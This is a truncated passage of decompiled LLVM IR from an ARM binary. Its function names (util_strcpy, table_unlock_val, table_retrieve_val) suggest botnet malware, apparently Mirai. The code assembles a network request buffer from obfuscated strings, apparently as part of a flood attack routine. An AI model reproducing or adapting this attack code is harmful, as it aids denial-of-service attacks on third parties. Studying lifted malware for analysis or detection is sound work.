  store i32 %v6_8f48, i32* %r3.global-to-local, align 4
  %v1_8f4c = urem i32 %v6_8f48, 2
  %v2_8f4c = icmp eq i32 %v1_8f4c, 0
  store i1 %v2_8f4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f4c, label %dec_label_pc_8ec0, label %dec_label_pc_8f54

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8f2c
  store i32 %v10_89fc, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8f6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_8f78, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8f84 = call i32 @getsockopt(i32 %v3_8f18, i32 1, i32 4, i32 %v2_8f6c, i32 %v2_8f78)
  store i32 %v10_89fc, i32* @r1, align 4
  %v3_8f8c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8f8c, i32* %r3.global-to-local, align 4
  %v2_8f90 = or i32 %v3_8f8c, %v5_8f84
  store i32 %v2_8f90, i32* %r0.global-to-local, align 4
  %v4_8f90 = icmp eq i32 %v2_8f90, 0
  store i1 %v4_8f90, i1* %cpsr_z.global-to-local, align 1
  %v0_8f98 = load i32, i32* @sl, align 4
  %v1_8f98 = add i32 %v0_8f98, -1452
  %v2_8f98 = inttoptr i32 %v1_8f98 to i32*
  %v3_8f98 = load i32, i32* %v2_8f98, align 4
  br i1 %v4_8f90, label %dec_label_pc_8f98, label %dec_label_pc_96a0

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f54
  store i32 %v3_8f98, i32* %r3.global-to-local, align 4
  %v3_8f9c = udiv i32 %v3_8f98, 32
  store i32 %v3_8f9c, i32* %r2.global-to-local, align 4
  %v1_8fa0 = urem i32 %v3_8f98, 32
  store i32 %v1_8fa0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8fa4 = mul nuw nsw i32 %v3_8f9c, 4
  store i32 %v3_8fa4, i32* @ip, align 4
  %v0_8fa8 = load i32, i32* @r4, align 4
  %v1_8fa8 = trunc i32 %v0_8fa8 to i8
  %v3_8fa8 = add i32 %v0_8f98, -1448
  %v4_8fa8 = inttoptr i32 %v3_8fa8 to i8*
  store i8 %v1_8fa8, i8* %v4_8fa8, align 1
  %v0_8ec8.pre = load i32, i32* @ip, align 4
  %v1_8ed0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8ec0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8d18
  %v1_8fb0 = add i32 %v3_8fbc, 4
  %v2_8fb0 = inttoptr i32 %v1_8fb0 to i32*
  %v3_8fb0 = load i32, i32* %v2_8fb0, align 4
  store i32 %v3_8fb0, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8fb4 = icmp eq i32 %v3_8fb0, 0
  store i1 %v2_8fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fb4, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8fb0
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_8d18, align 1
  %v0_8fc0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8fc0.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_8fc8

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_8fc0.pre = load i32, i32* @r3, align 4
  %v3_8fc0.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8fc0.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_8fb0
  %v3_8fc0 = phi i32 [ %v3_8fc0.pre, %.thread17..thread19_crit_edge ], [ %v3_8fbc, %dec_label_pc_8fb0 ]
  %v1_8fc0.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_8fb0 ]
  %v4_8fc0 = add i32 %v3_8fc0, -1448
  %v5_8fc0 = inttoptr i32 %v4_8fc0 to i8*
  store i8 %v1_8fc0.off0, i8* %v5_8fc0, align 1
  %v0_8fc4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8fc4.pr, label %.thread19.dec_label_pc_8d34_crit_edge, label %dec_label_pc_8fc8

.thread19.dec_label_pc_8d34_crit_edge:            ; preds = %.thread19
  %v0_8d34.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8d34

dec_label_pc_8fc8:                                ; preds = %.thread17, %.thread19, %dec_label_pc_8cc0
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_8fd0 = load i32, i32* @r5, align 4
  %v1_8fd0 = add i32 %v0_8fd0, 2112
  store i32 %v1_8fd0, i32* %r0.global-to-local, align 4
  %v1_8fd4 = load i32, i32* @r6, align 4
  %v2_8fd4 = add i32 %v1_8fd4, 12
  %v3_8fd4 = inttoptr i32 %v2_8fd4 to i32*
  store i32 -1, i32* %v3_8fd4, align 4
  %v0_8fd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_8fd8 = add i32 %v0_8fd8, 4
  store i32 %v1_8fd8, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8fe0 = load i32, i32* %sb.global-to-local, align 4
  %v1_8fe0 = load i32, i32* @r6, align 4
  %v2_8fe0 = inttoptr i32 %v1_8fe0 to i32*
  store i32 %v0_8fe0, i32* %v2_8fe0, align 4
  %v2_8fe4 = call i32 @util_zero(i32 %v1_8fd8, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8ff0 = load i32, i32* %sb.global-to-local, align 4
  %v1_8ff0 = load i32, i32* @r6, align 4
  %v2_8ff0 = add i32 %v1_8ff0, 660
  %v3_8ff0 = inttoptr i32 %v2_8ff0 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff0, align 4
  %v2_8ff4 = call i32 @util_zero(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ffc = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_9008 = add i32 %v0_9000, 1431
  store i32 %v1_9008, i32* %fp.global-to-local, align 4
  %v2_900c = add i32 %v2_8ffc, %stack_var_-20860.0.ph
  store i32 %v2_900c, i32* @r0, align 4
  store i32 %v1_9008, i32* %r1.global-to-local, align 4
  %v2_9014 = inttoptr i32 %v2_900c to i8*
  %v3_9014 = call i32 @util_strcpy(i8* %v2_9014, i32 %v1_9008)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_901c = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1b3b0.63 to i32), i32* %r1.global-to-local, align 4
  %v2_9028 = add i32 %v2_901c, %stack_var_-20860.0.ph
  store i32 %v2_9028, i32* @r0, align 4
  %v2_902c = inttoptr i32 %v2_9028 to i8*
  %v3_902c = call i32 @util_strcpy(i8* %v2_902c, i32 ptrtoint (i32* @global_var_1b3b0.63 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9034 = call i32 @util_strlen(i8* %v1_8ffc)
  %v2_903c = add i32 %v2_9034, %stack_var_-20860.0.ph
  store i32 %v2_903c, i32* @r0, align 4
  %v0_9040 = load i32, i32* @r5, align 4
  %v1_9040 = add i32 %v0_9040, 532
  store i32 %v1_9040, i32* %r1.global-to-local, align 4
  %v2_9044 = inttoptr i32 %v2_903c to i8*
  %v3_9044 = call i32 @util_strcpy(i8* %v2_9044, i32 %v1_9040)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_904c = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1b388.65 to i32), i32* %r1.global-to-local, align 4
  %v2_9058 = add i32 %v2_904c, %stack_var_-20860.0.ph
  store i32 %v2_9058, i32* @r0, align 4
  %v3_905c = inttoptr i32 %v2_9058 to i8*
  %v4_905c = call i32 @util_strcpy(i8* %v3_905c, i32 ptrtoint ([24 x i8]* @global_var_1b388.65 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9064 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_906c = load i32, i32* @r5, align 4
  %v1_906c = add i32 %v0_906c, 20
  store i32 %v1_906c, i32* %r1.global-to-local, align 4
  %v2_9070 = add i32 %v2_9064, %stack_var_-20860.0.ph
  store i32 %v2_9070, i32* @r0, align 4
  %v2_9074 = inttoptr i32 %v2_9070 to i8*
  %v3_9074 = call i32 @util_strcpy(i8* %v2_9074, i32 %v1_906c)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_907c = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b3a0.67 to i32), i32* %r1.global-to-local, align 4
  %v2_9088 = add i32 %v2_907c, %stack_var_-20860.0.ph
  store i32 %v2_9088, i32* @r0, align 4
  %v3_908c = inttoptr i32 %v2_9088 to i8*
  %v4_908c = call i32 @util_strcpy(i8* %v3_908c, i32 ptrtoint ([9 x i8]* @global_var_1b3a0.67 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9094 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_909c = load i32, i32* @r5, align 4
  %v2_90a0 = add i32 %v2_9094, %stack_var_-20860.0.ph
  store i32 %v2_90a0, i32* @r0, align 4
  %v1_90a4 = add i32 %v0_909c, 789
  store i32 %v1_90a4, i32* %r1.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v2_90a0 to i8*
  %v3_90a8 = call i32 @util_strcpy(i8* %v2_90a8, i32 %v1_90a4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_90b0 = call i32 @util_strlen(i8* %v1_8ffc)
  %v2_90b8 = add i32 %v2_90b0, %stack_var_-20860.0.ph
  store i32 %v2_90b8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v3_90c0 = inttoptr i32 %v2_90b8 to i8*
  %v4_90c0 = call i32 @util_strcpy(i8* %v3_90c0, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90c8 = call i32 @table_unlock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_90d0 = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_90d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_90d4, i32* %r1.global-to-local, align 4
  store i32 %v2_90d0, i32* @r4, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_90e0 = inttoptr i32 %v0_90d4 to i32*
  %v3_90e0 = call i32 @table_retrieve_val(i32 39, i32* %v2_90e0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_90e0, i32* %r1.global-to-local, align 4
  %v1_90ec = load i32, i32* @r4, align 4
  %v2_90ec = add i32 %v1_90ec, %stack_var_-20860.0.ph
  store i32 %v2_90ec, i32* @r0, align 4
  %v2_90f0 = inttoptr i32 %v2_90ec to i8*
  %v3_90f0 = call i32 @util_strcpy(i8* %v2_90f0, i32 %v3_90e0)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90f8 = call i32 @table_lock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9100 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_910c = add i32 %v2_9100, %stack_var_-20860.0.ph
  store i32 %v2_910c, i32* @r0, align 4
  %v3_9110 = inttoptr i32 %v2_910c to i8*
  %v4_9110 = call i32 @util_strcpy(i8* %v3_9110, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_9118 = call i32 @table_unlock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9120 = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_9124 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_9124, i32* %r1.global-to-local, align 4
  store i32 %v2_9120, i32* @r4, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_9130 = inttoptr i32 %v0_9124 to i32*
  %v3_9130 = call i32 @table_retrieve_val(i32 40, i32* %v2_9130)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9130, i32* %r1.global-to-local, align 4
  %v1_913c = load i32, i32* @r4, align 4
  %v2_913c = add i32 %v1_913c, %stack_var_-20860.0.ph
  store i32 %v2_913c, i32* @r0, align 4
  %v2_9140 = inttoptr i32 %v2_913c to i8*
  %v3_9140 = call i32 @util_strcpy(i8* %v2_9140, i32 %v3_9130)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_9148 = call i32 @table_lock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9150 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_915c = add i32 %v2_9150, %stack_var_-20860.0.ph
  store i32 %v2_915c, i32* @r0, align 4
  %v3_9160 = inttoptr i32 %v2_915c to i8*
  %v4_9160 = call i32 @util_strcpy(i8* %v3_9160, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9168 = call i32 @table_unlock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9170 = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_9174 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_9174, i32* %r1.global-to-local, align 4
  store i32 %v2_9170, i32* @r4, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9180 = inttoptr i32 %v0_9174 to i32*
  %v3_9180 = call i32 @table_retrieve_val(i32 41, i32* %v2_9180)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9180, i32* %r1.global-to-local, align 4
  %v1_918c = load i32, i32* @r4, align 4
  %v2_918c = add i32 %v1_918c, %stack_var_-20860.0.ph
  store i32 %v2_918c, i32* @r0, align 4
  %v2_9190 = inttoptr i32 %v2_918c to i8*
  %v3_9190 = call i32 @util_strcpy(i8* %v2_9190, i32 %v3_9180)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9198 = call i32 @table_lock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_91a0 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_91ac = add i32 %v2_91a0, %stack_var_-20860.0.ph
  store i32 %v2_91ac, i32* @r0, align 4
  %v3_91b0 = inttoptr i32 %v2_91ac to i8*
  %v4_91b0 = call i32 @util_strcpy(i8* %v3_91b0, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 %v4_91b0, i32* %r0.global-to-local, align 4
  store i32 %v6_8908, i32* %ip.global-to-local, align 4
  %v1_91b8 = load i32, i32* %sb.global-to-local, align 4
  %v3_91b8 = icmp uge i32 %v6_8908, %v1_91b8
  store i1 %v3_91b8, i1* %cpsr_c.global-to-local, align 1
  %v9_91b8 = icmp eq i32 %v6_8908, %v1_91b8
  store i1 %v9_91b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_91b8, label %dec_label_pc_9290, label %dec_label_pc_91c0

dec_label_pc_91c0:                                ; preds = %dec_label_pc_8fc8
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_91c4 = call i32 @table_unlock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_91cc = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_91d0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_91d0, i32* %r1.global-to-local, align 4
  store i32 %v2_91cc, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_91dc = inttoptr i32 %v0_91d0 to i32*
  %v3_91dc = call i32 @table_retrieve_val(i32 42, i32* %v2_91dc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_91dc, i32* %r1.global-to-local, align 4
  %v1_91e8 = load i32, i32* @r4, align 4
  %v2_91e8 = add i32 %v1_91e8, %stack_var_-20860.0.ph
  store i32 %v2_91e8, i32* @r0, align 4
  %v2_91ec = inttoptr i32 %v2_91e8 to i8*
  %v3_91ec = call i32 @util_strcpy(i8* %v2_91ec, i32 %v3_91dc)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_91f4 = call i32 @table_lock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_91fc = call i32 @util_strlen(i8* %v1_8ffc)
  %v2_9204 = add i32 %v2_91fc, %stack_var_-20860.0.ph
  store i32 %v2_9204, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v3_920c = inttoptr i32 %v2_9204 to i8*
  %v4_920c = call i32 @util_strcpy(i8* %v3_920c, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9214 = call i32 @util_strlen(i8* %v1_8ffc)
  %v0_9218 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_9218, i32* %r1.global-to-local, align 4
  store i32 %v2_9214, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_9224 = inttoptr i32 %v0_9218 to i32*
  %v3_9224 = call i32 @table_retrieve_val(i32 47, i32* %v2_9224)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9224, i32* %r1.global-to-local, align 4
  %v2_9230 = add i32 %v2_9214, %stack_var_-20860.0.ph
  store i32 %v2_9230, i32* @r0, align 4
  %v2_9234 = inttoptr i32 %v2_9230 to i8*
  %v3_9234 = call i32 @util_strcpy(i8* %v2_9234, i32 %v3_9224)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_923c = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3b0.63 to i32), i32* %r1.global-to-local, align 4
  %v2_9248 = add i32 %v2_923c, %stack_var_-20860.0.ph
  store i32 %v2_9248, i32* @r0, align 4
  %v2_924c = inttoptr i32 %v2_9248 to i8*
  %v3_924c = call i32 @util_strcpy(i8* %v2_924c, i32 ptrtoint (i32* @global_var_1b3b0.63 to i32))
  store i32 %v6_8908, i32* %r0.global-to-local, align 4
  %v2_9254 = call i32 @util_strlen(i8* %v1_9254)
  store i32 %v2_9254, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9260 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_926c = add i32 %v2_9260, %stack_var_-20860.0.ph
  store i32 %v2_926c, i32* %r2.global-to-local, align 4
  %v0_9270 = load i32, i32* @r4, align 4
  store i32 %v0_9270, i32* %r0.global-to-local, align 4
  %v3_9274 = trunc i32 %v0_9270 to i8
  %v4_9274 = call i32 @util_itoa(i8 %v3_9274, i32 10, i32 %v2_926c)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_927c = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_9288 = add i32 %v2_927c, %stack_var_-20860.0.ph
  store i32 %v2_9288, i32* @r0, align 4
  %v3_928c = inttoptr i32 %v2_9288 to i8*
  %v4_928c = call i32 @util_strcpy(i8* %v3_928c, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 %v4_928c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9290

dec_label_pc_9290:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_91c0
  %v0_9290 = load i32, i32* @r6, align 4
  %v1_9290 = add i32 %v0_9290, 16
  %v2_9290 = inttoptr i32 %v1_9290 to i32*
  %v3_9290 = load i32, i32* %v2_9290, align 4
  store i32 %v3_9290, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9294 = icmp eq i32 %v3_9290, 0
  store i1 %v2_9294, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_9290, 1
  br i1 %tmp177, label %dec_label_pc_933c, label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9290
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_92a0 = call i32 @util_strlen(i8* %v1_8ffc)
  %v2_92a8 = add i32 %v2_92a0, %stack_var_-20860.0.ph
  store i32 %v2_92a8, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b3c0.71 to i32), i32* %r1.global-to-local, align 4
  %v3_92b0 = inttoptr i32 %v2_92a8 to i8*
  %v4_92b0 = call i32 @util_strcpy(i8* %v3_92b0, i32 ptrtoint ([9 x i8]* @global_var_1b3c0.71 to i32))
  store i32 %v4_92b0, i32* %r0.global-to-local, align 4
  %v0_92b4 = load i32, i32* @r6, align 4
  %v1_92b4 = add i32 %v0_92b4, 16
  %v2_92b4 = inttoptr i32 %v1_92b4 to i32*
  %v3_92b4 = load i32, i32* %v2_92b4, align 4
  store i32 %v3_92b4, i32* %r3.global-to-local, align 4
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_92bc = icmp eq i32 %v3_92b4, 0
  store i1 %v2_92bc, i1* %cpsr_z.global-to-local, align 1
  %v0_92c0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_92c0, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_92b4, 1
  br i1 %tmp178, label %dec_label_pc_9324, label %dec_label_pc_92c8

dec_label_pc_92c8:                                ; preds = %dec_label_pc_929c, %dec_label_pc_92c8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_92cc = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_92d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_92dc = and i32 %v3_92d4, 33554432
  %v2_92dc = icmp ne i32 %v1_92dc, 0
  store i1 %v2_92dc, i1* %cpsr_c.global-to-local, align 1
  %v3_92dc = mul i32 %v3_92d4, 128
  %v1_92e0 = add i32 %v3_92dc, 1472
  %v2_92e4 = add i32 %v2_92cc, %stack_var_-20860.0.ph
  store i32 %v2_92e4, i32* @r0, align 4
  %v0_92e8 = load i32, i32* @r5, align 4
  %v2_92e8 = add i32 %v1_92e0, %v0_92e8
  store i32 %v2_92e8, i32* %r1.global-to-local, align 4
  %v2_92ec = inttoptr i32 %v2_92e4 to i8*
  %v3_92ec = call i32 @util_strcpy(i8* %v2_92ec, i32 %v2_92e8)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_92f4 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3cc.73 to i32), i32* %r1.global-to-local, align 4
  %v2_9300 = add i32 %v2_92f4, %stack_var_-20860.0.ph
  store i32 %v2_9300, i32* @r0, align 4
  %v3_9304 = inttoptr i32 %v2_9300 to i8*
  %v4_9304 = call i32 @util_strcpy(i8* %v3_9304, i32 ptrtoint ([3 x i8]* @global_var_1b3cc.73 to i32))
  store i32 %v4_9304, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_930c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_930c, i32* %r3.global-to-local, align 4
  %v0_9310 = load i32, i32* @r6, align 4
  %v1_9310 = add i32 %v0_9310, 16
  %v2_9310 = inttoptr i32 %v1_9310 to i32*
  %v3_9310 = load i32, i32* %v2_9310, align 4
  store i32 %v3_9310, i32* %r2.global-to-local, align 4
  %v1_9314 = add i32 %v3_930c, 1
  store i32 %v1_9314, i32* %ip.global-to-local, align 4
  %v3_9318 = icmp uge i32 %v3_9310, %v1_9314
  store i1 %v3_9318, i1* %cpsr_c.global-to-local, align 1
  %v9_9318 = icmp eq i32 %v3_9310, %v1_9314
  store i1 %v9_9318, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9314, i32* %stack_var_-44, align 4
  %v8_9320 = icmp sgt i32 %v3_9310, %v1_9314
  br i1 %v8_9320, label %dec_label_pc_92c8, label %dec_label_pc_9324

dec_label_pc_9324:                                ; preds = %dec_label_pc_92c8, %dec_label_pc_929c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9328 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_9334 = add i32 %v2_9328, %stack_var_-20860.0.ph
  store i32 %v2_9334, i32* @r0, align 4
  %v3_9338 = inttoptr i32 %v2_9334 to i8*
  %v4_9338 = call i32 @util_strcpy(i8* %v3_9338, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 %v4_9338, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_933c

dec_label_pc_933c:                                ; preds = %dec_label_pc_9290, %dec_label_pc_9324
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9340 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  %v2_934c = add i32 %v2_9340, %stack_var_-20860.0.ph
  store i32 %v2_934c, i32* @r0, align 4
  %v3_9350 = inttoptr i32 %v2_934c to i8*
  %v4_9350 = call i32 @util_strcpy(i8* %v3_9350, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32))
  store i32 %v4_9350, i32* %r0.global-to-local, align 4
  store i32 %v6_8908, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_9358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9358, label %dec_label_pc_9378, label %dec_label_pc_9360

dec_label_pc_9360:                                ; preds = %dec_label_pc_933c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_9364 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_8908, i32* %r1.global-to-local, align 4
  %v2_9370 = add i32 %v2_9364, %stack_var_-20860.0.ph
  store i32 %v2_9370, i32* @r0, align 4
  %v2_9374 = inttoptr i32 %v2_9370 to i8*
  %v3_9374 = call i32 @util_strcpy(i8* %v2_9374, i32 %v6_8908)
  store i32 %v3_9374, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9378

dec_label_pc_9378:                                ; preds = %dec_label_pc_933c, %dec_label_pc_9360
  %v0_9378 = load i32, i32* @r5, align 4
  %v1_9378 = add i32 %v0_9378, 1440
  store i32 %v1_9378, i32* %r4.global-to-local, align 4
  %v0_937c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_937c, i32* %r0.global-to-local, align 4
  store i32 %v1_9378, i32* %r1.global-to-local, align 4
  %v2_9384 = inttoptr i32 %v0_937c to i8*
  %v3_9384 = call i32 @util_strcmp(i8* %v2_9384, i32 %v1_9378)
  store i32 %v3_9384, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9388 = icmp eq i32 %v3_9384, 0
